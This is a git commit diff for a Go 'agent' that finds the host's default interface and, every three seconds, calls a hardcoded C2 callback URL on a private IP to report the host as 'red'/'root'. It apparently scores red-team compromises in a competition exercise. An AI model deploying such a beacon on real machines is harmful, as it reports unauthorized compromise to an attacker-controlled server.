62ab9dccee6bc180f4ad8ca610cbee2437dcd982
Kent 'picat' Gruber <kgruber1@emich.edu>
2020-02-29 09:14:59 -0500

    find default interface + add c2 IP/URL + remove server option

--- i2bn/cmd/agent/main.go
+++ i2bn/cmd/agent/main.go
@@ -4,34 +4,56 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"net"
 	"os"
 	"time"
 
 	"github.com/picatz/i2bn/client"
-	"github.com/picatz/i2bn/server"
 )
 
+func defaultInterface() string {
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		log.Fatal(err)
+	}
+	for _, iface := range ifaces {
+		// must have mac address, FlagUp and FlagBroadcast
+		if iface.HardwareAddr != nil && iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagBroadcast != 0 {
+			addrs, err := iface.Addrs()
+			if err != nil {
+				continue
+			}
+			for _, addr := range addrs {
+				return addr.String()
+			}
+			break
+		}
+	}
+	return "127.0.0.1"
+}
+
 func main() {
+	// ip to score
+	var ip string
 
 	if len(os.Args) == 1 {
-		fmt.Println("no arg given")
-		os.Exit(1)
+		ip = defaultInterface()
+	} else {
+		ip = os.Args[1]
 	}
 
-	switch os.Args[1] {
-	case "server":
-		s := server.New()
-		log.Println("Starting server")
-		panic(s.ListenAndServe())
-	case "client":
-		for ; ; time.Sleep(3 * time.Second) {
-			go func() {
-				log.Println("Making client request")
-				err := client.GetDemPoints(context.Background(), os.Args[2], os.Args[3], "red", "root")
-				if err != nil {
-					panic(err)
-				}
-			}()
-		}
+	for ; ; time.Sleep(3 * time.Second) {
+		go func() {
+			log.Println("Making client request")
+			// c2 ip + url
+			c2IP := "172.16.0.56"
+			c2URL := fmt.Sprintf("http://%v:5000/callback", c2IP)
+			// get them points
+			log.Printf("trying to score %v with %v", ip, c2URL)
+			err := client.GetDemPoints(context.Background(), c2URL, ip, "red", "root")
+			if err != nil {
+				panic(err)
+			}
+		}()
 	}
 }
